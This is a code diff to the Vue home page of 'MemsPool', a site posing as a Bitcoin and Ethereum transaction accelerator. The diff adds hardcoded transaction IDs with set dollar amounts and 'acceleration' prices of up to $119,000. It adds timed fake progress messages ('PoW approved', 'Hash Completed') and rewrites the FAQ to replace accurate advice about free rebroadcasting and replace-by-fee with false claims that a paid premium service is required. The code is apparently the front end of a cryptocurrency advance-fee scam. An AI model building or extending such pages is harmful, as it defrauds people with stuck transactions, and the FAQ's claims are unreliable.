@@ -1,15 +1,33 @@
 <template>
   <div class="home">
     <fund-wallet-modal @close="hideDialog" v-if="dialogIsVisible"  />
+    <fund-wallet-modal2 @close="hideDialog2" v-if="dialogIsVisible2"/>
+    <fund-wallet-modal3 @close="hideDialog3" @open="showDialog4" v-if="dialogIsVisible3"/>
+    <fund-wallet-modal4 @close="hideDialog4"  v-if="dialogIsVisible4"/>
+    <fund-wallet-modal5 @close="hideDialog5" v-if="dialogIsVisible5" />
     <div class="logo-main">
       <p class="logo"><span style="color: #f7931a;">Mems</span>Pool</p>
     </div>
 
     <div class="section-1">
-      <form class="input-button-wrapper" @submit.prevent="handleClick">
-        <input type="text" required v-model="inputValue" placeholder="TXID (Transaction ID) ..." class="text-input" />
+      <form class="input-button-wrapper" @submit.prevent="validateAndSubmit">
+<!--        <input type="text" required v-model="inputValue" placeholder="TXID (Transaction ID) ..." class="text-input" -->
+<!--               :class="{'input-error': showError}" />-->
+        <input
+            type="text"
+            required
+            v-model="inputValue"
+            placeholder="TXID (Transaction ID) ..."
+            class="text-input"
+            @input="clearValidationError"
+            :pattern="pattern"
+            ref="txidInput"
+        />
         <button v-if="!showActionText" class="submit-button">Accelerate</button>
       </form>
+
+      <p v-if="showError" class="error-message">Please match the format requested.</p>
+
 
       <div class="action-wrapper">
         <div class="seprate" v-if="loading === true">
@@ -19,7 +37,20 @@
         </div>
 
         <div class="action-text-part" v-if="showActionText">
-          <p class="action-text-part-text-1">Transaction Pending confirmation! To accelerate your Transaction click proceed and
+          <p class="action-text-part-text-1" v-if="this.inputValue === '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad'" >
+            Transaction Pending Confirmation! To accelerate your transaction of $660,000, please click Proceed and follow the steps displayed.
+          </p>
+          <p class="action-text-part-text-1" v-if="this.inputValue === '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6'">
+            Transaction Pending Confirmation! To accelerate your transaction of $45,000, please click Proceed and follow the steps displayed.
+          </p>
+          <p class="action-text-part-text-1" v-if="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'">
+            Transaction Pending Confirmation! To accelerate your transaction of $100,020, please click Proceed and follow the steps displayed.
+          </p>
+          <p class="action-text-part-text-1"
+             v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
+     this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+          >Transaction Pending confirmation! To accelerate your Transaction click proceed and
             follow the steps displayed</p>
           <p class="submit-button-2" @click="handleClick3">Proceed</p>
         </div>
@@ -35,12 +66,29 @@
             <label>Select Payment Method:</label>
             <select required v-model="selectValue"  class="text-input">
               <option value="Bitcoin">Bitcoin</option>
+              <option v-show="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'" value="Ethereum">Ethereum</option>
             </select>
           </div>
         </div>
 
         <div class="price-container" v-if="showActionText2">
-          <div class="price-container-1">
+          <div v-if="this.inputValue === '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad'" class="price-container-1">
+            <p class="price-container-text-1">Price:</p>
+            <p class="price-container-text-2">$4,000</p>
+          </div>
+          <div v-if="this.inputValue === '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6'" class="price-container-1">
+            <p class="price-container-text-1">Price:</p>
+            <p class="price-container-text-2">$1,500</p>
+          </div>
+          <div v-if="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'" class="price-container-1">
+            <p class="price-container-text-1">Price:</p>
+            <p class="price-container-text-2">$0</p>
+          </div>
+          <div
+              v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
+     this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+     this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+              class="price-container-1">
             <p class="price-container-text-1">Price:</p>
             <p class="price-container-text-2">$119,000</p>
           </div>
@@ -49,7 +97,14 @@
               <span class="loader2"></span>
 <!--              <p class="loader-text" style="padding-left: 5px;">Loading ...</p>-->
             </div>
-            <p v-else class="price-container-text-3" @click="showDialog">Submit Order</p>
+            <div v-else>
+              <p v-if="this.inputValue === '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' ||
+     this.inputValue === '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' ||
+     this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
+                  class="price-container-text-3" @click="showDialog5">Submit Order</p>
+              <p v-else  class="price-container-text-3" @click="showDialog">Submit Order</p>
+            </div>
+
           </div>
         </div>
 
@@ -68,17 +123,78 @@
 
       </div>
 
+      <div class="action-wrapper">
+        <div class="seprate" v-if="loading6 === true">
+          <span class="loader"></span>
+          <p class="loader-text" style="padding-left: 5px;">... please wait</p>
+
+        </div>
+
+        <div class="action-text-part" v-if="showActionText4">
+          <p class="action-text-part-text-1">Great news! PoW approved and your funds are set for transfer.</p>
+          <p class="submit-button-2" @click="handleClick5">Proceed</p>
+        </div>
+
+        <div class="seprate" v-if="loading7 === true">
+          <span class="loader"></span>
+          <p class="loader-text" style="padding-left: 5px;">Processing ...</p>
+
+        </div>
+
+<!--        <div class="seprate" v-if="loading9 === true">-->
+<!--          <span class="loader2"></span>-->
+<!--          &lt;!&ndash;              <p class="loader-text" style="padding-left: 5px;">Loading ...</p>&ndash;&gt;-->
+<!--        </div>-->
+
+<!--        <div class="input-button-wrapper" v-if="showActionText2">-->
+<!--          <div style="display: flex;flex-direction: column;width: 100%;margin-top: 10px;">-->
+<!--            <label>Select Payment Method:</label>-->
+<!--            <select required v-model="selectValue"  class="text-input">-->
+<!--              <option value="Bitcoin">Bitcoin</option>-->
+<!--            </select>-->
+<!--          </div>-->
+<!--        </div>-->
+
+<!--        <div class="price-container" v-if="showActionText2">-->
+<!--          <div class="price-container-1">-->
+<!--            <p class="price-container-text-1">Price:</p>-->
+<!--            <p class="price-container-text-2">$119,000</p>-->
+<!--          </div>-->
+<!--          <div class="price-container-2">-->
+<!--            <div class="seprate" v-if="loading5 === true">-->
+<!--              <span class="loader2"></span>-->
+<!--              &lt;!&ndash;              <p class="loader-text" style="padding-left: 5px;">Loading ...</p>&ndash;&gt;-->
+<!--            </div>-->
+<!--            <p v-else class="price-container-text-3" @click="showDialog">Submit Order</p>-->
+<!--          </div>-->
+<!--        </div>-->
+
+<!--        <div class="info-container" v-if="showActionText2">-->
+<!--          <p class="info-container-text">-->
+<!--            By clicking "Submit Order", you agree to our <span class="premium">terms and conditions.</span>-->
+<!--          </p>-->
+<!--        </div>-->
+
+
+        <div class="seprate" v-if="loading8 === true">
+          <span class="loader"></span>
+          <p class="loader-text" style="padding-left: 5px;">Processing ...</p>
+
+        </div>
+
+      </div>
+
       <div class="section-1-text-1">
 
-        <p class="text-1">Premium Bitcoin Transaction Accelerator (FAQ)</p>
+        <p class="text-1">Premium Blockchain Transaction Acceleration (FAQ)</p>
 
         <hr class="new1">
 
         <p class="text-2">Whаt іѕ Memspool, аnd hоw dоеѕ іt wоrk?</p>
 
-        <p class="text-3"><span>Memspool</span> іѕ а frее Віtсоіn trаnѕасtіоn ассеlеrаtоr thаt еnаblеѕ fаѕtеr
+        <p class="text-3"><span>Memspool</span> іѕ а premium Etherum and Bitcoin transaction ассеlеrаtоr thаt еnаblеѕ fаѕtеr
           соnfіrmаtіоnѕ fоr уоur unсоnfіrmеd trаnѕасtіоnѕ. Іt ореrаtеѕ bу rеbrоаdсаѕtіng trаnѕасtіоnѕ tо
-          <span>20</span> рорulаr аnd hіghlу соnnесtеd Віtсоіn nоdеѕ.
+          <span>20</span> рорulаr аnd highly connected blockchain nodes.
         </p>
 
         <p class="text-4">
@@ -95,7 +211,7 @@
         <p class="text-5">Whу іѕ mу trаnѕасtіоn stuck or unсоnfіrmеd?</p>
 
         <p class="text-6">
-          Аѕ mоrе реорlе ѕtаrt tо uѕе Віtсоіn, thе blосk ѕіzе rеасhеѕ іtѕ lіmіt, lеаdіng tо а сrоwdеd Віtсоіn nеtwоrk.
+          As more people start to use ethereum and Bitcoin, thе blосk ѕіzе rеасhеѕ іtѕ lіmіt, Leading to a crowded blockchain nеtwоrk.
           Соnѕеquеntlу, lоw-fее trаnѕасtіоnѕ аrе dеlауеd, especially on a high volume transaction over a million dollar
           аnd ѕоmеtіmеѕ еvеn drорреd (рurgеd) frоm thе соnfіrmаtіоn quеuе (mеmрооl).
         </p>
@@ -173,8 +289,8 @@
 
         <p class="text-6">
           Тrаnѕасtіоn rеbrоаdсаѕtіng саn bе bеnеfісіаl іn сеrtаіn ѕіtuаtіоnѕ, раrtісulаrlу whеn thе nеtwоrk іѕ nоt
-          ехсеѕѕіvеlу соngеѕtеd. Ноwеvеr, іt ѕhоuld bе nоtеd thаt thіѕ ѕеrvісе іѕ рrоvіdеd frее оf сhаrgе аnd саnnоt bе
-          соmраrеd tо thе рrіоrіtіzаtіоn оf trаnѕасtіоnѕ bу mіnіng рооlѕ. Іn hеаvіlу соngеѕtеd nеtwоrkѕ, іtѕ іmрасt mау
+          ехсеѕѕіvеlу соngеѕtеd. Ноwеvеr, Be aware that this service is a premium offering and will receive prioritized
+          transactions by the pools. Іn hеаvіlу соngеѕtеd nеtwоrkѕ, іtѕ іmрасt mау
           bе mіnіmаl. Іn ѕuсh саѕеѕ, іt іѕ аdvіѕаblе tо соnѕіdеr аltеrnаtіvе fоrmѕ оf trаnѕасtіоn ассеlеrаtіоn.
         </p>
 
@@ -223,8 +339,8 @@
         </p>
 
         <p class="text-6">
-          Іn gеnеrаl, <span>wе саnnоt соmmіt tо аnу ѕресіfіс tіmеfrаmеѕ</span> bесаuѕе thеrе аrе mаnу fасtоrѕ thаt аffесt thе
-          соnfіrmаtіоn оf а trаnѕасtіоn. Аѕ уоu саn ѕее, еvеn luсk рlауѕ а ѕіgnіfісаnt rоlе.
+          In general, we are dedicated to completing the block and addressing factors affecting confirmation
+          within a 5-10 minute timeframe.
         </p>
         <hr class="new1">
       </div>
@@ -233,15 +349,18 @@
 
         <p class="text-5">How can I accelerate а transaction myself?</p>
 
-        <p class="text-7">You can use one of the following techniques to speed up your transaction confirmation
-          yourself:</p>
+        <p class="text-7">
+          The only way to accelerate a transaction is to use a premium rebroadcasting site that enables you to connect
+          your hash both on the site and the Batmain Antminer to speed up your stuck transaction in the block
+          following these:
+        </p>
 
         <div class="lawrence">
           <p class="sep">.</p>
           <p class="text-8">
             <span>The current transaction rebroadcasting service.</span>
-            Іt'ѕ frее, ѕо іt wоn't соѕt уоu аnуthіng tо trу. Іf уоu'rе соnсеrnеd аbоut уоur рrіvасу, rеѕt аѕѕurеd thаt
-            wе kеер аbѕоlutеlу nо dаtа frоm thе trаnѕасtіоnѕ wе dіѕtrіbutе fоr frее.
+            It will cost you a premium fee to rebroadcast and clear your transaction from the block. Rest assured
+            that we keep absolutely no data from the transaction we distribute.
           </p>
         </div>
 
@@ -249,8 +368,8 @@
           <p class="sep">.</p>
           <p class="text-8">
             <span>Replace-by-fee (RBF).</span>
-            If your transaction is RBF-enabled, you can bump its fee via your wallet. This is the easiest and most
-            standardized approach.
+            Please note that not all wallets support Replace-By-Fee (RBF). To address this issue,
+            we offer a premium service to enhance your transaction by enabling RBF with a fee.
           </p>
         </div>
 
@@ -281,10 +400,16 @@
 
 import FooterHome from "@/components/BaseComponents/FooterHome.vue";
 import FundWalletModal from "@/components/BaseComponents/modal/FundWalletModal.vue";
+import Swal from "sweetalert2";
+import FundWalletModal2 from "@/components/BaseComponents/modal/FundWalletModal2.vue";
+import FundWalletModal3 from "@/components/BaseComponents/modal/FundWalletModal3.vue";
+import FundWalletModal4 from "@/components/BaseComponents/modal/FundWalletModal4.vue";
+import FundWalletModal5 from "@/components/BaseComponents/modal/FundWalletModal5.vue";
+import axios from "axios";
 
 export default {
   name: 'HomeView',
-  components: {FundWalletModal, FooterHome},
+  components: {FundWalletModal5, FundWalletModal4, FundWalletModal3, FundWalletModal2, FundWalletModal, FooterHome},
   data() {
     return {
       inputValue: '',
@@ -293,14 +418,27 @@ export default {
       loading3: false,
       loading4: false,
       loading5: false,
+      loading6: false,
+      loading7: false,
+      loading8: false,
+      loading9: false,
       dialogIsVisible: false,
+      dialogIsVisible2: false,
+      dialogIsVisible3: false,
+      dialogIsVisible4: false,
+      dialogIsVisible5: false,
       showActionText: false, // Controls visibility of action text part
       showActionText2: false, // Controls visibility of action text part
       showActionText3: false, // Controls visibility of action text part
+      showActionText4: false, // Controls visibility of action text part
       selectValue: "",
-      inputValue3: 119000,
+      inputValue3: "",
       inputValue2: '',
+      inputValueEth: '',
       bitcoinRate: null,
+      ethereumRate: null,
+      showError: false, // Add this data property to manage error visibility
+      pattern: ".{64,}", // This pattern requires at least 64 characters
     };
   },
   methods: {
@@ -322,22 +460,105 @@ export default {
           });
     },
 
+    fetchEthereumRate() {
+      // Set loading to true when the request starts
+      this.loading = true;
+
+      // Use CoinGecko API to fetch the Ethereum price
+      axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
+          .then(response => {
+            this.ethereumRate = response.data.ethereum.usd;
+            // Set loading to false when the data is successfully fetched
+            this.loading = false;
+          })
+          .catch(error => {
+            console.error(error);
+            // Set loading to false if there is an error
+            this.loading = false;
+          });
+    },
+
+    convertAndSave2() {
+      this.inputValue3 = 0;
+      const usdAmount = parseFloat(this.inputValue3);
+      this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+    },
+
     // convertAndSave() {
-    //   if (this.bitcoinRate && this.inputValue3) {
-    //     const usdAmount = parseFloat(this.inputValue3);
-    //     if (!isNaN(usdAmount)) {
-    //       this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
-    //     } else {
-    //       this.inputValue2 = '';
-    //     }
-    //   } else {
-    //     this.inputValue2 = '';
-    //   }
+    //   const usdAmount = parseFloat(this.inputValue3);
+    //   this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
     // },
 
     convertAndSave() {
-      const usdAmount = parseFloat(this.inputValue3);
-      this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      // Check if inputValue3 is the specific address
+      if (this.inputValue === "0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad") {
+        // If the address matches, set inputValue3 to 15000
+        this.inputValue3 = 4000;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      }  if (this.inputValue === "0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6") {
+        // If the address matches, set inputValue3 to 5000
+        this.inputValue3 = 1500;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      }if (this.inputValue === "0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5") {
+        // If the address matches, set inputValue3 to 5000
+        this.inputValue3 = 0;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      }  if (this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
+          this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+          this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5') {
+        // Proceed with the conversion using the normal inputValue3
+        this.inputValue3 = 119000;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      }
+
+    },
+
+    async validateAndSubmit() {
+      const txidInput = this.$refs.txidInput;
+      if (this.inputValue.length < 62) {
+        txidInput.setCustomValidity("Please match the format requested. TXID should be 62 characters long.");
+        txidInput.reportValidity(); // Display the validation message
+      } else if (this.inputValue === '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33'
+          || this.inputValue === '0x1ed4cedfb235556ee5598c902dff761eaa7927b7f869e8b4d04fa1228fb2d9f8') {
+        // block of code to be executed if the condition1 is false and condition2 is true
+
+        if (this.inputValue === '0xc71732bbd9bd2076bb90fa5d80fb9a06591708b8d42cbe3c7a326f2c7b306e33') {
+          // block of code to be executed if the condition is true
+          Swal.fire({
+            icon: 'success',
+            title: 'Hash Completed',
+            text: 'Completed in the block',
+          });
+        } else {
+          // block of code to be executed if the condition is false
+          // await Swal.fire({
+          //   icon: 'info',
+          //   title: 'Hash processing',
+          //   text: 'Block 30462 of 30450 to be completed',
+          //   footer: '<span style="color: #00bc00;">PoW Received</span>',
+          // });
+          await this.handleClick4()
+        }
+        this.$store.commit('updateHash', { inputValue: this.inputValue });
+      this.inputValue = "";
+      } else {
+        this.$store.commit('updateHash', { inputValue: this.inputValue });
+        txidInput.setCustomValidity(""); // Clear the validation message
+        this.handleClick(); // Proceed with form submission
+      }
+    },
+
+    clearValidationError() {
+      const txidInput = this.$refs.txidInput;
+      txidInput.setCustomValidity(""); // Clear the validation error when the user types
     },
 
     handleClick() {
@@ -362,6 +583,28 @@ export default {
       }, 3000);
     },
 
+    handleClick4() {
+      console.log('Input Value:', this.inputValue);
+      this.loading6 = true; // Show the loader
+
+      // Wait for 3 seconds before showing the action text part
+      setTimeout(() => {
+        this.loading6 = false; // Hide the loader
+        this.showActionText4 = true; // Show the action text part
+      }, 3000);
+    },
+
+    handleClick5() {
+      this.loading7 = true; // Show the loader
+
+      // Wait for 3 seconds before showing the action text part
+      setTimeout(() => {
+        this.loading7 = false; // Hide the loader
+        // this.showActionText2 = true; // Show the action text part
+        this.showDialog3() // show third modal
+      }, 3000);
+    },
+
     hideDialog() {
       this.dialogIsVisible = false;
       this.showActionText = false; // close the action text part
@@ -378,15 +621,82 @@ export default {
         this.loading5 = false; // Hide the loader
         this.dialogIsVisible = true;
         this.convertAndSave()
+        this.convertAndSave2()
+        this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
         this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
+        this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
       }, 3000);
+    },
+
+    hideDialog2() {
+      this.dialogIsVisible2 = false;
+    },
+    showDialog2() {
+      this.dialogIsVisible2 = true;
+    },
+
+    hideDialog3() {
+      this.dialogIsVisible3 = false;
+      this.showActionText = false; // close the action text part
+      this.showActionText2 = false; // close the action text part
+      this.showActionText3 = false; // close the action text part
+      this.showActionText4 = false; // close the action text part
+      this.loading8 = false; // Show the loader
+      this.inputValue = "";
+    },
+    showDialog3() {
+
+      this.dialogIsVisible3 = true;
+      this.convertAndSave()
+      this.convertAndSave2()
+      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
+      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
+      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
+    },
+
+    hideDialog4() {
+      this.dialogIsVisible4 = false;
+      this.showActionText = false; // close the action text part
+      this.showActionText2 = false; // close the action text part
+      this.showActionText3 = false; // close the action text part
+      this.showActionText4 = false; // close the action text part
+      this.loading8 = true; // Show the loader
+      this.inputValue = "";
+    },
+    showDialog4() {
+      this.dialogIsVisible4 = true;
+      this.convertAndSave()
+      this.convertAndSave2()
+      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
+      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
+      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
+    },
+
+    hideDialog5() {
+      this.dialogIsVisible5 = false;
+      this.showActionText = false; // close the action text part
+      this.showActionText2 = false; // close the action text part
+      this.showActionText3 = false; // close the action text part
+      this.showActionText4 = false; // close the action text part
+      this.loading8 = true; // Show the loader
+      this.inputValue = "";
+    },
+    showDialog5() {
+      this.dialogIsVisible5 = true;
+      this.convertAndSave()
+      this.convertAndSave2()
+      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
+      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
+      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
     },
   },
   created() {
     this.fetchBitcoinRate()
+    this.fetchEthereumRate()
   },
   mounted() {
     this.fetchBitcoinRate()
+    this.fetchEthereumRate()
   }
 }
 </script>
@@ -394,6 +704,16 @@ export default {
 <style>
 /* index.css or in <style> of App.vue */
 @import url('https://fonts.googleapis.com/css2?family=Peralta&display=swap');
+
+.input-error {
+  border: 1px solid red;
+}
+
+.error-message {
+  color: red;
+  font-size: 0.875rem;
+  margin-top: 5px;
+}
 
 .section-1{
   width: 50%;
@@ -426,6 +746,10 @@ export default {
   font-size: 16px;
   border: 1px solid #ccc;
   border-radius: 4px 0 0 4px;
+}
+
+.text-input::placeholder {
+  font-size: 13px;
 }
 
 .submit-button {
